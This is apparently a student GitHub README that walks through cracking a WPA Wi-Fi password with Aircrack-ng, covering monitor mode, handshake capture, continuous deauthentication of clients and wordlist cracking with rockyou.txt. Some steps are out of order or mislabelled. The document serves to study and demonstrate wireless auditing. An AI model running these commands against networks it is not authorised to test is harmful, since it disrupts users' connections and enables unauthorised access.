# attacker-tools-analysis
A project analyzing and demonstrating the use of attacker tools like Aircrack-ng and Hydra, focusing on network security.

Step 1: Installing Aircrack-ng
![image](https://github.com/user-attachments/assets/5225b4d6-af17-4487-b964-41b6d970772d)
sudo apt install aircrack-ng

Explanation: This command installs the Aircrack-ng suite for auditing Wi-Fi network security.

Step 2: Removing Conflicting or Unnecessary Packages
![image](https://github.com/user-attachments/assets/3c2337fc-4af5-40b5-a716-cc4a2c869e6a)
sudo apt remove fern-wifi-cracker

Explanation: Removes unnecessary/conflicting tools like fern-wifi-cracker to ensure a clean environment for Aircrack-ng operations.

Step 3: Confirming Installation and Cleanup
![image](https://github.com/user-attachments/assets/b48b7c4e-ec59-4cb0-8f54-26dde800a51f)
sudo apt install aircrack-ng

Explanation: Confirms Aircrack-ng installation and frees up disk space for optimal performance.

Step 4: Scanning for Wi-Fi Networks
![image](https://github.com/user-attachments/assets/b3cc0e41-eb57-4ac6-aa3f-06e8bfb24f21)
airodump-ng wlan0mon

Explanation: Scans and displays details of available Wi-Fi networks, including their BSSID, channel, and encryption type.

Step 5: Enabling Monitor Mode with Aircrack-ng
![image](https://github.com/user-attachments/assets/fb56d954-696f-41ea-9726-b3277e5844a9)
airmon-ng start wlan0

Explanation: Switches the wireless interface to monitor mode to capture packets for analysis.

Step 6: Verifying Network Interface Configuration
![image](https://github.com/user-attachments/assets/9194be97-e120-4969-9d2d-ffdc365f8d26)
ifconfig

Explanation: Displays network interface status to ensure readiness for testing.

Step 7: Cracking Wi-Fi Password with Aircrack-ng
![image](https://github.com/user-attachments/assets/d72159a1-42aa-4d0a-b6e4-3de9d0814241)
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt

Explanation: Attempts to crack the WPA password using the rockyou.txt wordlist.

Step 8: Stopping Monitor Mode
![image](https://github.com/user-attachments/assets/479b597e-1f54-4731-9cb9-f3d3db865081)
airmon-ng stop wlan0mon

Explanation: Disables monitor mode and returns the interface to managed mode.

Step 9: Viewing Captured WPA Handshake in Wireshark
![image](https://github.com/user-attachments/assets/2b7acac5-4a3f-49cf-a53c-30cbd195039e)

Explanation: Analyzes the WPA handshake using Wireshark, highlighting key details such as EAPOL packets.

Step 10: Capturing WPA Handshake
![image](https://github.com/user-attachments/assets/d98b76da-6385-48e7-ad89-1f7ad985b3b3)
airodump-ng -c [channel] --bssid [AP_BSSID] -w hack1 wlan0mon

Explanation:The left terminal shows the captured WPA handshake information, confirming the handshake has been saved in the file hack1-01.cap. This file will be used for cracking the encryption later.
The right terminal displays the continuous sending of deauthentication packets to disrupt the connection, which triggers handshake re-establishment.

Step 11: Performing Deauthentication and Capturing Handshake
![image](https://github.com/user-attachments/assets/b59f92c5-12a6-493e-9260-b246957e044f)
aireplay-ng --deauth 0 -a [AP_BSSID] wlan0mon

Explanation: Disrupts client connections to the targeted network, ensuring handshake capture.

Step 12: Filtering Target Network
![image](https://github.com/user-attachments/assets/ddf29a69-319e-48a9-b032-2b6d3bc1ae67)
airodump-ng wlan0mon -d [Target_BSSID]

Explanation:Focuses on a specific target network for refined data capture.

Step 13: Cracking the Captured Handshake
![image](https://github.com/user-attachments/assets/d2fdfc71-5835-458c-b75d-0c4efe032398)
aircrack-ng [capture_file] -w [wordlist_path]

Explanation:
 Tests wordlist passwords against captured data to reveal the Wi-Fi key.
